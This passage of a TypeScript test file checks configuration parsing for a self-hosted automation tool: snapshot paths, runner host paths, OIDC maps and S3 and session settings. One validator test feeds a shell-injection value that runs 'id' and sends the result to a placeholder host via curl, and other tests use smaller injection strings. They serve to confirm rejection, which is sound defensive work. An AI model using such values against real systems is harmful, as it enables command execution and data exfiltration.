      setImportedRef("owner/repo", 7, NATIVE_ID);

      const dashboardIssueUrl = `${mod.DASHBOARD_URL?.replace(/\/+$/, "") ?? ""}/issues/${NATIVE_ID}`;
      expect(mod.issueUrl("owner/repo", 7)).toBe(dashboardIssueUrl);
      // The native id itself resolves the same way.
      expect(mod.issueUrl("owner/repo", NATIVE_ID)).toBe(dashboardIssueUrl);
      // forgeIssueUrl is deliberately unresolved — it never consults the index.
      expect(mod.forgeIssueUrl("owner/repo", 7)).toBe("https://git.home.bstjohn.net/owner/repo/issues/7");
    } finally {
      resetImportedRefsForTest();
    }
  });

  it("warns when Forgejo repos are configured but no token is set (#2670)", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({}));
    process.env["CLAWS_FORGEJO_REPOS"] = "owner/migrated";
    mod.reloadConfig();

    expect(vi.mocked(console.warn).mock.calls.flat().join(" ")).toContain("no Forgejo token");
  });

  it("does not warn when a Forgejo token is configured (#2670)", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({ forgejoToken: "file-token" }));
    mod.reloadConfig();

    expect(vi.mocked(console.warn).mock.calls.flat().join(" ")).not.toContain("no Forgejo token");
  });
});

describe("PublicSnapshotSchema publishPaths", () => {
  it("round-trips a config file with a publishPaths pair", async () => {
    const mod = await import("./config.js");
    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(
      mod.CONFIG_PATH,
      JSON.stringify({ publicSnapshots: [{ source: "a/b", target: "c/d", publishPaths: ["apps/immich/", "x.yaml"] }] }),
    );
    mod.reloadConfig();
    expect(mod.PUBLIC_SNAPSHOTS).toEqual([
      { source: "a/b", target: "c/d", publishPaths: ["apps/immich/", "x.yaml"] },
    ]);
  });

  it("rejects publishPaths combined with mirrorReleases", async () => {
    const { PublicSnapshotSchema } = await import("./config.js");
    expect(PublicSnapshotSchema.safeParse({ source: "a/b", target: "c/d", publishPaths: ["x"], mirrorReleases: true }).success).toBe(false);
  });

  it("rejects an empty publishPaths", async () => {
    const { PublicSnapshotSchema } = await import("./config.js");
    expect(PublicSnapshotSchema.safeParse({ source: "a/b", target: "c/d", publishPaths: [] }).success).toBe(false);
  });

  it("rejects traversal and absolute publishPaths entries", async () => {
    const { PublicSnapshotSchema } = await import("./config.js");
    expect(PublicSnapshotSchema.safeParse({ source: "a/b", target: "c/d", publishPaths: ["../x"] }).success).toBe(false);
    expect(PublicSnapshotSchema.safeParse({ source: "a/b", target: "c/d", publishPaths: ["/abs"] }).success).toBe(false);
    for (const bad of ["./apps/immich", "apps//immich", "apps\\immich", "", "/"]) {
      expect(PublicSnapshotSchema.safeParse({ source: "a/b", target: "c/d", publishPaths: [bad] }).success).toBe(false);
    }
  });
});

describe("PublicSnapshotSchema scrubPaths (#1962)", () => {
  it("accepts and round-trips a config file with a scrubPaths pair", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(
      mod.CONFIG_PATH,
      JSON.stringify({
        publicSnapshots: [
          { source: "a/b", target: "c/d", scrubPaths: ["apps/authentik/configmap-blueprints.yaml"] },
        ],
      }),
    );

    mod.reloadConfig();

    expect(mod.PUBLIC_SNAPSHOTS).toEqual([
      { source: "a/b", target: "c/d", scrubPaths: ["apps/authentik/configmap-blueprints.yaml"] },
    ]);
  });

  it("rejects a pair combining mirrorReleases with a non-empty scrubPaths", async () => {
    const { PublicSnapshotSchema } = await import("./config.js");

    const result = PublicSnapshotSchema.safeParse({
      source: "a/b",
      target: "c/d",
      mirrorReleases: true,
      scrubPaths: ["x"],
    });

    expect(result.success).toBe(false);
  });

  it("accepts mirrorReleases alone and scrubPaths alone", async () => {
    const { PublicSnapshotSchema } = await import("./config.js");

    expect(PublicSnapshotSchema.safeParse({ source: "a/b", target: "c/d", mirrorReleases: true }).success).toBe(true);
    expect(PublicSnapshotSchema.safeParse({ source: "a/b", target: "c/d", scrubPaths: ["x"] }).success).toBe(true);
  });

  it("scrubs the GPS-carrying workshop photos from the 3d-models snapshot by default (#3118)", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({}));

    mod.reloadConfig();

    const pair = mod.PUBLIC_SNAPSHOTS.find((p) => p.target === "stjohnb/3d-models");
    expect(pair?.scrubPaths).toEqual([
      "power-workshop/images/photos/IMG_2823.jpg",
      "power-workshop/images/photos/IMG_2824.jpg",
      "power-workshop/images/photos/IMG_2825.jpg",
      "power-workshop/images/photos/IMG_2826.jpg",
      "power-workshop/images/photos/IMG_2827.jpg",
    ]);
  });

  it("validates latestTagPattern", async () => {
    const { PublicSnapshotSchema } = await import("./config.js");
    const base = { source: "a/b", target: "c/d" };
    expect(PublicSnapshotSchema.safeParse({ ...base, mirrorReleases: true, latestTagPattern: "^v\\d+$" }).success).toBe(true);
    expect(PublicSnapshotSchema.safeParse({ ...base, mirrorReleases: true, latestTagPattern: "(" }).success).toBe(false);
    expect(PublicSnapshotSchema.safeParse({ ...base, latestTagPattern: "^v" }).success).toBe(false);
  });

  it("carries latestTagPattern on the TempoStatusBar default", async () => {
    const { PUBLIC_SNAPSHOTS } = await import("./config.js");
    const t = PUBLIC_SNAPSHOTS.find((s) => s.target === "stjohnb/TempoStatusBar");
    expect(t?.latestTagPattern).toBe("^v\\d+\\.\\d+\\.\\d+$");
  });

  it("accepts a valid https releaseAssetUrl and rejects an invalid one (#2115)", async () => {
    const { PublicSnapshotSchema } = await import("./config.js");

    expect(
      PublicSnapshotSchema.safeParse({
        source: "a/b", target: "c/d", mirrorReleases: true, releaseAssetUrl: "https://x/y-{version}.dmg",
      }).success,
    ).toBe(true);
    expect(
      PublicSnapshotSchema.safeParse({
        source: "a/b", target: "c/d", mirrorReleases: true, releaseAssetUrl: "http://x/y.dmg",
      }).success,
    ).toBe(false);
  });
});

describe("RunnerHostSchema actionsDir validation", () => {
  it("accepts a valid absolute path", async () => {
    const { RunnerHostSchema } = await import("./config.js");
    expect(RunnerHostSchema.safeParse({ host: "h", actionsDir: "/home/actions/actions-runner" }).success).toBe(true);
    expect(RunnerHostSchema.safeParse({ host: "h", actionsDir: "/opt/runner_2.0" }).success).toBe(true);
  });

  it("rejects a path with shell injection characters", async () => {
    const { RunnerHostSchema } = await import("./config.js");
    expect(RunnerHostSchema.safeParse({ host: "h", actionsDir: "/home/actions; curl http://x/$(id) #" }).success).toBe(false);
  });

  it("rejects a relative path", async () => {
    const { RunnerHostSchema } = await import("./config.js");
    expect(RunnerHostSchema.safeParse({ host: "h", actionsDir: "relative/path" }).success).toBe(false);
  });

  it("rejects a path with spaces", async () => {
    const { RunnerHostSchema } = await import("./config.js");
    expect(RunnerHostSchema.safeParse({ host: "h", actionsDir: "/a b" }).success).toBe(false);
  });

  it("rejects a path with backtick", async () => {
    const { RunnerHostSchema } = await import("./config.js");
    expect(RunnerHostSchema.safeParse({ host: "h", actionsDir: "/a`b" }).success).toBe(false);
  });

  it("rejects a path with ampersands", async () => {
    const { RunnerHostSchema } = await import("./config.js");
    expect(RunnerHostSchema.safeParse({ host: "h", actionsDir: "/a&&b" }).success).toBe(false);
  });

  it("accepts a valid systemd entry", async () => {
    const { RunnerHostSchema } = await import("./config.js");
    expect(RunnerHostSchema.safeParse({
      host: "h",
      serviceUnit: "github-runner-beefy-actions",
      workDir: "/var/lib/github-runner-beefy-actions-work",
      toolDir: "/var/lib/github-runner-beefy-actions-tool",
    }).success).toBe(true);
  });

  it("rejects a systemd entry missing toolDir", async () => {
    const { RunnerHostSchema } = await import("./config.js");
    expect(RunnerHostSchema.safeParse({
      host: "h",
      serviceUnit: "github-runner-beefy-actions",
      workDir: "/var/lib/github-runner-beefy-actions-work",
    }).success).toBe(false);
  });

  it("rejects an unsafe serviceUnit", async () => {
    const { RunnerHostSchema } = await import("./config.js");
    expect(RunnerHostSchema.safeParse({
      host: "h",
      serviceUnit: "unit; id",
      workDir: "/var/lib/github-runner-beefy-actions-work",
      toolDir: "/var/lib/github-runner-beefy-actions-tool",
    }).success).toBe(false);
  });

  it("rejects an entry with neither actionsDir nor serviceUnit", async () => {
    const { RunnerHostSchema } = await import("./config.js");
    expect(RunnerHostSchema.safeParse({ host: "h" }).success).toBe(false);
  });
});

describe("LABEL_SPECS", () => {
  it("keeps every description within GitHub's 100-character label limit and every color a valid hex", async () => {
    const { LABEL_SPECS } = await import("./config.js");
    for (const [name, spec] of Object.entries(LABEL_SPECS)) {
      expect(spec.description.length, `${name} description is ${spec.description.length} chars`).toBeLessThanOrEqual(100);
      expect(spec.color, `${name} color is "${spec.color}"`).toMatch(/^[0-9a-f]{6}$/);
    }
  });
});

describe("parseOidcHostMap (#2841)", () => {
  it("parses a single host=url pair", async () => {
    const { parseOidcHostMap } = await import("./config.js");
    expect(parseOidcHostMap("claws.example.net=https://auth.example.net")).toEqual({
      "claws.example.net": "https://auth.example.net",
    });
  });

  it("parses multiple comma-separated pairs", async () => {
    const { parseOidcHostMap } = await import("./config.js");
    expect(
      parseOidcHostMap(
        "claws.example.net=https://auth.example.net,other.example=https://auth.other.example",
      ),
    ).toEqual({
      "claws.example.net": "https://auth.example.net",
      "other.example": "https://auth.other.example",
    });
  });

  it("normalises a scheme-prefixed, port-suffixed, uppercase key to a bare lowercase host", async () => {
    const { parseOidcHostMap } = await import("./config.js");
    expect(
      parseOidcHostMap("HTTPS://Claws.Example.Net:443=https://auth.example.net"),
    ).toEqual({
      "claws.example.net": "https://auth.example.net",
    });
  });

  it("normalises a value with a trailing slash and path to its origin", async () => {
    const { parseOidcHostMap } = await import("./config.js");
    expect(
      parseOidcHostMap("claws.example.net=https://auth.example.net/some/path/"),
    ).toEqual({
      "claws.example.net": "https://auth.example.net",
    });
  });

  it("drops an entry with no '=' without throwing", async () => {
    const { parseOidcHostMap } = await import("./config.js");
    expect(parseOidcHostMap("claws.example.net")).toEqual({});
  });

  it("drops an entry with an empty key without throwing", async () => {
    const { parseOidcHostMap } = await import("./config.js");
    expect(parseOidcHostMap("=https://auth.example.net")).toEqual({});
  });

  it("drops an entry with a non-URL value without throwing", async () => {
    const { parseOidcHostMap } = await import("./config.js");
    expect(parseOidcHostMap("claws.example.net=not-a-url")).toEqual({});
  });

  it("returns {} for empty or whitespace input", async () => {
    const { parseOidcHostMap } = await import("./config.js");
    expect(parseOidcHostMap("")).toEqual({});
    expect(parseOidcHostMap("   ")).toEqual({});
  });
});

describe("per-repo claws.json job locking (#2885)", () => {
  it("unions disabledJobsByRepo with the repo's own disabledJobs", async () => {
    const mod = await import("./config.js");
    const repoConfig = await import("./repo-config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(
      mod.CONFIG_PATH,
      JSON.stringify({ disabledJobsByRepo: { "owner/repo": ["ci-fixer"] } }),
    );
    mod.reloadConfig();

    repoConfig.clearRepoConfigCache();
    await repoConfig.refreshRepoConfigs([{ fullName: "owner/repo" }], async () =>
      JSON.stringify({ disabledJobs: ["doc-maintainer"] }),
    );

    expect(mod.getRepoJobExclusions()).toEqual([
      { repo: "owner/repo", job: "ci-fixer", hostDisabled: true, repositoryDisabled: false },
      { repo: "owner/repo", job: "doc-maintainer", hostDisabled: false, repositoryDisabled: true },
    ]);
    expect(mod.getLockedJobsForRepo("owner/repo")).toEqual(["doc-maintainer"]);
    expect(mod.isJobDisabledForRepo("doc-maintainer", "owner/repo")).toBe(true);
    expect(mod.isJobDisabledForRepo("ci-fixer", "owner/repo")).toBe(true);
    expect(mod.isJobDisabledForRepo("issue-dispatcher", "owner/repo")).toBe(false);

    repoConfig.clearRepoConfigCache();
  });
});

describe("per-repo claws.json settings migrated off the host config (#2898)", () => {
  it("unions macRunnerRepos with repos declaring a macos runner, deduping case-insensitively", async () => {
    const mod = await import("./config.js");
    const repoConfig = await import("./repo-config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({ macRunnerRepos: ["Owner/HostRepo"] }));
    mod.reloadConfig();

    repoConfig.clearRepoConfigCache();
    await repoConfig.refreshRepoConfigs(
      [{ fullName: "owner/hostrepo" }, { fullName: "Owner/SelfDeclared" }, { fullName: "owner/linux-only" }],
      async (fullName) =>
        fullName === "owner/linux-only" ? "{}" : JSON.stringify({ runners: ["macos"] }),
    );

    // The host casing wins for the repo both sources name, and it appears once.
    expect(mod.getMacRunnerRepos()).toEqual(["Owner/HostRepo", "Owner/SelfDeclared"]);

    repoConfig.clearRepoConfigCache();
  });

  it("excludes a self-declared macos runner repo whose claws.json sets enabled: false", async () => {
    const mod = await import("./config.js");
    const repoConfig = await import("./repo-config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({ macRunnerRepos: [] }));
    mod.reloadConfig();

    repoConfig.clearRepoConfigCache();
    await repoConfig.refreshRepoConfigs([{ fullName: "Owner/Paused" }], async () =>
      JSON.stringify({ runners: ["macos"], enabled: false }),
    );

    expect(mod.getMacRunnerRepos()).toEqual([]);

    repoConfig.clearRepoConfigCache();
  });

  it("unions the built-in grafana-alert with every enabled repo's incidentLabels", async () => {
    const mod = await import("./config.js");
    const repoConfig = await import("./repo-config.js");

    repoConfig.clearRepoConfigCache();
    expect(mod.getIncidentLabels()).toEqual(["grafana-alert"]);

    await repoConfig.refreshRepoConfigs(
      [{ fullName: "owner/a" }, { fullName: "owner/b" }, { fullName: "owner/paused" }],
      async (fullName) =>
        fullName === "owner/paused"
          ? JSON.stringify({ enabled: false, incidentLabels: ["paused-alert"] })
          : JSON.stringify({ incidentLabels: ["grafana-alert", "sev1"] }),
    );

    expect(mod.getIncidentLabels()).toEqual(["grafana-alert", "sev1"]);

    repoConfig.clearRepoConfigCache();
  });

  it("unions prodAlertWorkflows and mainBuildIgnoreWorkflows per repo", async () => {
    const mod = await import("./config.js");
    const repoConfig = await import("./repo-config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(
      mod.CONFIG_PATH,
      JSON.stringify({
        prodAlertWorkflows: { "owner/repo": ["deploy.yml"] },
        mainBuildMonitorIgnoreWorkflows: { "owner/repo": ["nightly.yml"] },
      }),
    );
    mod.reloadConfig();

    repoConfig.clearRepoConfigCache();
    await repoConfig.refreshRepoConfigs([{ fullName: "owner/repo" }], async () =>
      JSON.stringify({ prodAlertWorkflows: ["publish.yml", "deploy.yml"], mainBuildIgnoreWorkflows: ["flaky.yml"] }),
    );

    expect(mod.getProdAlertWorkflows("owner/repo")).toEqual(["deploy.yml", "publish.yml"]);
    expect(mod.getMainBuildIgnoreWorkflows("owner/repo")).toEqual(["nightly.yml", "flaky.yml"]);
    expect(mod.getProdAlertWorkflows("owner/other")).toEqual([]);

    repoConfig.clearRepoConfigCache();
  });

  it("reads issuePreviewSummaryUrl from the repo's own claws.json", async () => {
    const mod = await import("./config.js");
    const repoConfig = await import("./repo-config.js");

    repoConfig.clearRepoConfigCache();
    const url = "https://www.bstjohn.net/3d-models/issue-preview/{issue}/{sha8}/preview-summary.json";
    await repoConfig.refreshRepoConfigs([{ fullName: "owner/repo" }], async () =>
      JSON.stringify({ issuePreviewSummaryUrl: url }),
    );

    expect(mod.getIssuePreviewSummaryUrl("owner/repo")).toBe(url);
    expect(mod.getIssuePreviewSummaryUrl("owner/other")).toBeNull();

    repoConfig.clearRepoConfigCache();
  });

  describe("pages host default (#clw_01M3J52H0H9WSH3GTSY87ZY351)", () => {
    const PAGES_ENV: Record<string, string> = {
      CLAWS_PAGES_S3_ENDPOINT: "http://garage.default.svc.cluster.local:3900/",
      CLAWS_PAGES_S3_REGION: "garage",
      CLAWS_PAGES_S3_BUCKET: "pages",
      CLAWS_PAGES_BASE_URL: "https://pages.home.bstjohn.net/",
      CLAWS_PAGES_S3_ACCESS_KEY_ID: "GKexample",
      CLAWS_PAGES_S3_SECRET_ACCESS_KEY: "secret-value",
    };

    afterEach(async () => {
      for (const k of Object.keys(PAGES_ENV)) delete process.env[k];
      (await import("./config.js")).reloadConfig();
    });

    it("defaults to the pages host path when configured, and keeps an explicit value", async () => {
      const mod = await import("./config.js");
      const repoConfig = await import("./repo-config.js");
      Object.assign(process.env, PAGES_ENV);
      mod.reloadConfig();

      repoConfig.clearRepoConfigCache();
      const url = "https://www.bstjohn.net/3d-models/issue-preview/{issue}/{sha8}/preview-summary.json";
      await repoConfig.refreshRepoConfigs([{ fullName: "St-John-Software/3d-models" }], async () =>
        JSON.stringify({ issuePreviewSummaryUrl: url }),
      );

      expect(mod.getPagesHostConfig()).toEqual({
        endpoint: "http://garage.default.svc.cluster.local:3900",
        region: "garage",
        bucket: "pages",
        baseUrl: "https://pages.home.bstjohn.net",
        accessKeyId: "GKexample",
        secretAccessKey: "secret-value",
      });
      expect(mod.getIssuePreviewSummaryUrl("St-John-Software/3d-models")).toBe(url);
      expect(mod.getIssuePreviewSummaryUrl("St-John-Software/HA-Carlink")).toBe(
        "https://pages.home.bstjohn.net/ha-carlink/issue/{issue}/{sha8}/preview-summary.json",
      );
      repoConfig.clearRepoConfigCache();
    });

    it("has no default when any pages var is missing", async () => {
      const mod = await import("./config.js");
      Object.assign(process.env, PAGES_ENV);
      delete process.env["CLAWS_PAGES_S3_SECRET_ACCESS_KEY"];
      mod.reloadConfig();

      expect(mod.getPagesHostConfig()).toBeNull();
      expect(mod.getIssuePreviewSummaryUrl("St-John-Software/ha-carlink")).toBeNull();
    });

    it("masks the pages host on the config display", async () => {
      const mod = await import("./config.js");
      Object.assign(process.env, PAGES_ENV);
      mod.reloadConfig();

      const display = JSON.stringify(mod.getConfigForDisplay());
      expect(display).not.toContain("secret-value");
      expect(display).not.toContain("GKexample");
    });
  });

  describe("attachments bucket (#clw_01M5APX7YF3AGWHV1S1WMHJDR6)", () => {
    const ATTACHMENTS_ENV: Record<string, string> = {
      CLAWS_ATTACHMENTS_S3_ENDPOINT: "http://garage.default.svc.cluster.local:3900/",
      CLAWS_ATTACHMENTS_S3_REGION: "garage",
      CLAWS_ATTACHMENTS_S3_BUCKET: "claws-attachments",
      CLAWS_ATTACHMENTS_S3_ACCESS_KEY_ID: "GKattach",
      CLAWS_ATTACHMENTS_S3_SECRET_ACCESS_KEY: "attach-secret",
    };

    afterEach(async () => {
      for (const k of Object.keys(ATTACHMENTS_ENV)) delete process.env[k];
      (await import("./config.js")).reloadConfig();
    });

    it("is configured from all five vars, with the endpoint trimmed", async () => {
      const mod = await import("./config.js");
      Object.assign(process.env, ATTACHMENTS_ENV);
      mod.reloadConfig();
      expect(mod.ATTACHMENTS_S3).toEqual({
        endpoint: "http://garage.default.svc.cluster.local:3900",
        region: "garage",
        bucket: "claws-attachments",
        accessKeyId: "GKattach",
        secretAccessKey: "attach-secret",
      });
      const display = JSON.stringify(mod.getConfigForDisplay());
      expect(display).not.toContain("attach-secret");
      expect(display).not.toContain("GKattach");
    });

    it("is null when unset or when any var is missing", async () => {
      const mod = await import("./config.js");
      mod.reloadConfig();
      expect(mod.ATTACHMENTS_S3).toBeNull();
      Object.assign(process.env, ATTACHMENTS_ENV);
      delete process.env["CLAWS_ATTACHMENTS_S3_BUCKET"];
      mod.reloadConfig();
      expect(mod.ATTACHMENTS_S3).toBeNull();
    });
  });

  describe("print server (#clw_01M498X85G9KCWHAX28RHG0F7Y)", () => {
    afterEach(async () => {
      delete process.env["CLAWS_PRINT_SERVER"];
      (await import("./config.js")).reloadConfig();
    });

    it("is empty when CLAWS_PRINT_SERVER is unset", async () => {
      const mod = await import("./config.js");
      delete process.env["CLAWS_PRINT_SERVER"];
      mod.reloadConfig();
      expect(mod.PRINT_SERVER).toBe("");
    });

    it("round-trips a trimmed CLAWS_PRINT_SERVER through reloadConfig", async () => {
      const mod = await import("./config.js");
      process.env["CLAWS_PRINT_SERVER"] = "  cups.default.svc.cluster.local:631 ";
      mod.reloadConfig();
      expect(mod.PRINT_SERVER).toBe("cups.default.svc.cluster.local:631");
    });
  });

  describe("prod tailnet hosts", () => {
    afterEach(async () => {
      delete process.env["CLAWS_PROD_CLUSTER_TAILNET_HOST"];
      delete process.env["CLAWS_PROD_DATA_TAILNET_HOST"];
      (await import("./config.js")).reloadConfig();
    });

    it("defaults to the current node names", async () => {
      const mod = await import("./config.js");
      delete process.env["CLAWS_PROD_CLUSTER_TAILNET_HOST"];
      delete process.env["CLAWS_PROD_DATA_TAILNET_HOST"];
      mod.reloadConfig();
      expect(mod.PROD_CLUSTER_TAILNET_HOST).toBe("prod-cluster-11");
      expect(mod.PROD_DATA_TAILNET_HOST).toBe("prod-data-14");
    });

    it("round-trips an env override through reloadConfig", async () => {
      const mod = await import("./config.js");
      process.env["CLAWS_PROD_CLUSTER_TAILNET_HOST"] = " prod-cluster-12 ";
      mod.reloadConfig();
      expect(mod.PROD_CLUSTER_TAILNET_HOST).toBe("prod-cluster-12");
    });

    it("falls back to the default for an invalid value", async () => {
      const mod = await import("./config.js");
      process.env["CLAWS_PROD_DATA_TAILNET_HOST"] = "foo=bar";
      mod.reloadConfig();
      expect(mod.PROD_DATA_TAILNET_HOST).toBe("prod-data-14");
    });
  });
});

describe("parseSessionAutoCompactIdleMs (#3090)", () => {
  it("defaults to 30 minutes, treats 0 as off and falls back to 30 on garbage", async () => {
    const { parseSessionAutoCompactIdleMs } = await import("./config.js");
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
    try {
      expect(parseSessionAutoCompactIdleMs({})).toBe(30 * 60_000);
      expect(parseSessionAutoCompactIdleMs({ CLAWS_SESSION_AUTO_COMPACT_IDLE_MINUTES: " 45 " })).toBe(45 * 60_000);
      expect(parseSessionAutoCompactIdleMs({ CLAWS_SESSION_AUTO_COMPACT_IDLE_MINUTES: "0" })).toBe(0);
      expect(warn).not.toHaveBeenCalled();
      for (const bad of ["soon", "-5", "1.5"]) {
        expect(parseSessionAutoCompactIdleMs({ CLAWS_SESSION_AUTO_COMPACT_IDLE_MINUTES: bad })).toBe(30 * 60_000);
      }
      expect(warn).toHaveBeenCalledTimes(3);

      warn.mockClear();
      expect(parseSessionAutoCompactIdleMs({ CLAWS_SESSION_AUTO_COMPACT_IDLE_MINUTES: "90" })).toBe(90 * 60_000);
      expect(warn).toHaveBeenCalledTimes(1);
      expect(warn.mock.calls[0]?.[0]).toMatch(/>= 60/);
    } finally {
      warn.mockRestore();
    }
  });
});

describe("parseRoleEnv (#clw_01M5APX7YF3AGWHV1S1WMHJDR6)", () => {
  it("defaults to all and ignores the controller URL outside the web role", async () => {
    const { parseRoleEnv } = await import("./config.js");
    expect(parseRoleEnv({})).toEqual({ role: "all", controllerUrl: "" });
    expect(parseRoleEnv({ CLAWS_ROLE: " controller ", CLAWS_CONTROLLER_URL: "http://x:3000" })).toEqual({ role: "controller", controllerUrl: "" });
  });

  it("needs a controller URL for the web role and strips its trailing slash", async () => {
    const { parseRoleEnv } = await import("./config.js");
    expect(parseRoleEnv({ CLAWS_ROLE: "web", CLAWS_CONTROLLER_URL: "http://claws-controller:3000/" }))
      .toEqual({ role: "web", controllerUrl: "http://claws-controller:3000" });
    expect(() => parseRoleEnv({ CLAWS_ROLE: "web" })).toThrow("CLAWS_ROLE=web needs CLAWS_CONTROLLER_URL");
  });

  it("throws on an unknown role", async () => {
    const { parseRoleEnv } = await import("./config.js");
    expect(() => parseRoleEnv({ CLAWS_ROLE: "worker" })).toThrow('Invalid CLAWS_ROLE "worker" — expected one of: all, controller, web');
  });
});

describe("parseSessionRuntimeEnv (#3026)", () => {
  it("defaults to k8s-pod with the pod defaults when nothing is set", async () => {
    const { parseSessionRuntimeEnv } = await import("./config.js");
    const parsed = parseSessionRuntimeEnv({ KUBERNETES_SERVICE_HOST: "10.0.0.1" }, "v2026-09-14.1");
    expect(parsed.backend).toBe("k8s-pod");
    expect(parsed.pod).toEqual({
      namespace: "claws-sessions",
      image: "registry.home.bstjohn.net/st-john-software/claws:v2026-09-14.1",
      imagePullSecrets: ["registry-pull"],
      storageClassName: "local-path",
      storageSize: "20Gi",
      nodeSelector: {},
      priorityClassName: "",
      cpuRequest: "250m",
      memoryRequest: "1Gi",
      memoryLimit: "6Gi",
      mcpUrl: "",
      claudeTheme: "auto",
    });
  });

  it("trims CLAWS_SESSION_MCP_URL and strips its trailing slash (#3056)", async () => {
    const { parseSessionRuntimeEnv } = await import("./config.js");
    expect(parseSessionRuntimeEnv({ CLAWS_SESSION_MCP_URL: " http://claws.default.svc:3000/ " }, "v1").pod.mcpUrl)
      .toBe("http://claws.default.svc:3000");
    expect(parseSessionRuntimeEnv({ CLAWS_SESSION_MCP_URL: "http://claws.default.svc:3000" }, "v1").pod.mcpUrl)
      .toBe("http://claws.default.svc:3000");
  });

  it("accepts k8s-pod, defaults to it when unset or empty, and throws on any other value", async () => {
    const { parseSessionRuntimeEnv } = await import("./config.js");
    expect(parseSessionRuntimeEnv({ CLAWS_SESSION_BACKEND: "k8s-pod" }, "v1").backend).toBe("k8s-pod");
    expect(parseSessionRuntimeEnv({}, "v1").backend).toBe("k8s-pod");
    expect(parseSessionRuntimeEnv({ CLAWS_SESSION_BACKEND: "  " }, "v1").backend).toBe("k8s-pod");
    const message = (value: string) =>
      `Invalid CLAWS_SESSION_BACKEND "${value}" — the only supported value is k8s-pod (host tmux sessions were removed)`;
    for (const value of ["local-tmux", "bogus", "k8s", "K8S-POD"]) {
      expect(() => parseSessionRuntimeEnv({ CLAWS_SESSION_BACKEND: value }, "v1")).toThrow(message(value));
    }
  });

  it("leaves the image empty on a dev build unless one is set explicitly", async () => {
    const { parseSessionRuntimeEnv } = await import("./config.js");
    expect(parseSessionRuntimeEnv({}, "dev").pod.image).toBe("");
    expect(parseSessionRuntimeEnv({ CLAWS_SESSION_IMAGE: "registry/claws:test" }, "dev").pod.image).toBe("registry/claws:test");
  });

  it("pins the default session image to the published version, and to empty on dev (#3057)", async () => {
    const { parseSessionRuntimeEnv } = await import("./config.js");
    expect(parseSessionRuntimeEnv({}, "v2026-09-14.8").pod.image).toBe("registry.home.bstjohn.net/st-john-software/claws:v2026-09-14.8");
    expect(parseSessionRuntimeEnv({}, "dev").pod.image).toBe("");
  });

  it("parses the node selector, pull secrets and priority class", async () => {
    const { parseSessionRuntimeEnv } = await import("./config.js");
    const { pod } = parseSessionRuntimeEnv({
      CLAWS_SESSION_NODE_SELECTOR: "kubernetes.io/hostname=k3s, disk=ssd",
      CLAWS_SESSION_IMAGE_PULL_SECRETS: "a,b",
      CLAWS_SESSION_PRIORITY_CLASS: "standard",
      CLAWS_SESSION_NAMESPACE: "sessions-test",
    }, "v1");
    expect(pod.nodeSelector).toEqual({ "kubernetes.io/hostname": "k3s", disk: "ssd" });
    expect(pod.imagePullSecrets).toEqual(["a", "b"]);
    expect(pod.priorityClassName).toBe("standard");
    expect(pod.namespace).toBe("sessions-test");
    expect(() => parseSessionRuntimeEnv({ CLAWS_SESSION_NODE_SELECTOR: "nokey" }, "v1")).toThrow(/NODE_SELECTOR/);
  });

  it("exports k8s-pod when CLAWS_SESSION_BACKEND is unset", async () => {
    const mod = await import("./config.js");
    expect(mod.SESSION_BACKEND).toBe("k8s-pod");
  });
});

describe("parseWorkRuntimeEnv (#clw_01M34R5RECDPPXVXBJZS1DA6C1)", () => {
  const SESSION = { image: "ghcr.io/st-john-software/claws:v1", mcpUrl: "http://claws.claws.svc:3000" };

  it("defaults to in-process with the agent pod defaults", async () => {
    const { parseWorkRuntimeEnv } = await import("./config.js");
    const parsed = parseWorkRuntimeEnv({ KUBERNETES_SERVICE_HOST: "10.0.0.1" }, { image: "", mcpUrl: "" });
    expect(parsed.backend).toBe("in-process");
    expect(parsed.pod).toEqual({
      cpuRequest: "500m",
      memoryRequest: "2Gi",
      memoryLimit: "6Gi",
      ephemeralStorageRequest: "4Gi",
      ephemeralStorageLimit: "24Gi",
      homeSize: "20Gi",
      offNode: null,
    });
  });

  it("accepts k8s-pod and throws on any other value", async () => {
    const { parseWorkRuntimeEnv } = await import("./config.js");
    expect(parseWorkRuntimeEnv({ CLAWS_WORK_BACKEND: "k8s-pod" }, SESSION).backend).toBe("k8s-pod");
    expect(parseWorkRuntimeEnv({ CLAWS_WORK_BACKEND: " in-process " }, SESSION).backend).toBe("in-process");
    expect(() => parseWorkRuntimeEnv({ CLAWS_WORK_BACKEND: "k8s" }, SESSION)).toThrow(/Invalid CLAWS_WORK_BACKEND/);
    expect(() => parseWorkRuntimeEnv({ CLAWS_WORK_BACKEND: "K8S-POD" }, SESSION)).toThrow();
  });

  it("rejects k8s-pod when the resolved session image is empty", async () => {
    const { parseWorkRuntimeEnv, parseSessionRuntimeEnv } = await import("./config.js");
    const devSession = parseSessionRuntimeEnv({ CLAWS_SESSION_MCP_URL: SESSION.mcpUrl }, "dev").pod;
    expect(() => parseWorkRuntimeEnv({ CLAWS_WORK_BACKEND: "k8s-pod" }, devSession))
      .toThrow("CLAWS_WORK_BACKEND=k8s-pod needs a published image");
    const overridden = parseSessionRuntimeEnv({ CLAWS_SESSION_MCP_URL: SESSION.mcpUrl, CLAWS_SESSION_IMAGE: "registry/claws:test" }, "dev").pod;
    expect(parseWorkRuntimeEnv({ CLAWS_WORK_BACKEND: "k8s-pod" }, overridden).backend).toBe("k8s-pod");
    // In-process never needs one.
    expect(parseWorkRuntimeEnv({}, devSession).backend).toBe("in-process");
  });

